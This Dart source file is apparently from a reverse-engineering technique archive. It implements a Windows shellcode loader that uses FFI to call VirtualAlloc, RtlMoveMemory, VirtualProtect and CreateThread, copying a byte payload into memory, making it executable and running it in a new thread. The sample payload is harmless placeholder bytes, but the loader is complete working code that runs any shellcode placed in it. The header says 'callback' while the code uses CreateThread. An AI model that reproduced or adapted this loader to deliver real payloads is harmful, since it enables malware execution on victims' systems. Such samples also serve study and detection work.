/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ dart pub get
    $ dart compile exe code.dart 

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  
*/

import 'dart:io';
import 'dart:ffi';
import 'dart:convert';
import 'dart:typed_data';
import 'package:ffi/ffi.dart';

final MEM_COMMIT  = 0x1000;
final MEM_RESERVE = 0x2000;
final MEM_RELEASE = 0x8000;
final MEM_FREE    = 0x10000;

final PAGE_READONLY = 0x02;
final PAGE_READWRITE = 0x04;
final PAGE_EXECUTE = 0x10;
final PAGE_EXECUTE_READ = 0x20;
final PAGE_EXECUTE_READWRITE = 0x40;

final _kernel32 = DynamicLibrary.open("kernel32.dll");
final _ntdll    = DynamicLibrary.open("ntdll.dll");

typedef PTHREAD_START_ROUTINE = Uint32 Function(Pointer param);

class SECURITY_ATTRIBUTES extends Struct {
  @Uint32()
  int nlength;
  Pointer lpSecurityDescriptor;
  @Int32()
  int bInheritHandle;
}

Pointer VirtualAlloc(Pointer<Void> addr, int size, int alloctype, int prot) 
{
  final _VirtualAlloc = _kernel32.lookupFunction<
      Pointer<Void> Function(Pointer<Void> addr, IntPtr size, Uint32 alloctype,  Uint32 prot),
      Pointer<Void> Function(Pointer<Void> addr, int size, int alloctype, int prot)>
      ("VirtualAlloc");
  return _VirtualAlloc(addr, size, alloctype, prot);
}

int VirtualProtect(Pointer<Void> addr, int size, int newprot, Pointer<Uint32> oldprot) 
{
  final _VirtualProtect = _kernel32.lookupFunction<
      Uint8 Function(Pointer<Void> addr, IntPtr size, Uint32 newprot, Pointer<Uint32> oldprot),
      int   Function(Pointer<Void> addr, int size, int newprot, Pointer<Uint32> oldprot)>
      ("VirtualProtect");
  return _VirtualProtect(addr, size, newprot, oldprot);
}

void RtlMoveMemory(Pointer<Uint8> dst, Pointer<Uint8> src, int length) 
{
  final _RtlMoveMemory = _ntdll.lookupFunction<
      Void Function(Pointer<Uint8> dst, Pointer<Uint8> src, Uint32 length),
      void Function(Pointer<Uint8> dst, Pointer<Uint8> src, int length)>
      ("RtlMoveMemory");
  return _RtlMoveMemory(dst, src, length);
}

int CreateThread(
    Pointer<SECURITY_ATTRIBUTES> lpThreadAttributes,
    int dwStackSize,
    Pointer<NativeFunction<PTHREAD_START_ROUTINE>> lpStartAddress,
    Pointer lpParameter,
    int dwCreationFlags,
    Pointer<Uint32> lpThreadId) 
{
  final _CreateThread = _kernel32.lookupFunction<
      IntPtr Function(
          Pointer<SECURITY_ATTRIBUTES> lpThreadAttributes,
          IntPtr dwStackSize,
          Pointer<NativeFunction<PTHREAD_START_ROUTINE>> lpStartAddress,
          Pointer lpParameter,
          Uint32 dwCreationFlags,
          Pointer<Uint32> lpThreadId),
      int Function(
          Pointer<SECURITY_ATTRIBUTES> lpThreadAttributes,
          int dwStackSize,
          Pointer<NativeFunction<PTHREAD_START_ROUTINE>> lpStartAddress,
          Pointer lpParameter,
          int dwCreationFlags,
          Pointer<Uint32> lpThreadId)>
      ("CreateThread");
  return _CreateThread(
      lpThreadAttributes, dwStackSize, lpStartAddress,
      lpParameter, dwCreationFlags, lpThreadId);
}

int WaitForSingleObject(int hHandle, int dwMilliseconds) {
  final _WaitForSingleObject = _kernel32.lookupFunction<
      Uint32 Function(IntPtr hHandle, Uint32 dwMilliseconds),
      int Function(int hHandle, int dwMilliseconds)>
      ("WaitForSingleObject");
  return _WaitForSingleObject(hHandle, dwMilliseconds);
}


void main() {
  var oldprot = calloc<Uint32>();

  // shellcode storage in stack 
  var payload = [0x90, 0x90, 0xCC, 0xC3];
  Pointer<Uint8> ss = calloc(payload.length);
  
  // allocate memory buffer for payload as READ-WRITE (no executable)
  var runtime = VirtualAlloc(nullptr, payload.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // copy payload to the buffer
  for (var i = 0; i < payload.length; i++) {
    ss.elementAt(i).value = payload[i].toUnsigned(8);
  }
  RtlMoveMemory(runtime.cast<Uint8>(), ss, payload.length);

  // make buffer executable
  VirtualProtect (runtime, payload.length, PAGE_EXECUTE_READ, oldprot);

  // execute shellcode as new thread
  var th_shellcode = CreateThread (nullptr, 0, Pointer.fromAddress(runtime.address), nullptr, 0, nullptr);
  WaitForSingleObject(th_shellcode, 4294967295);
}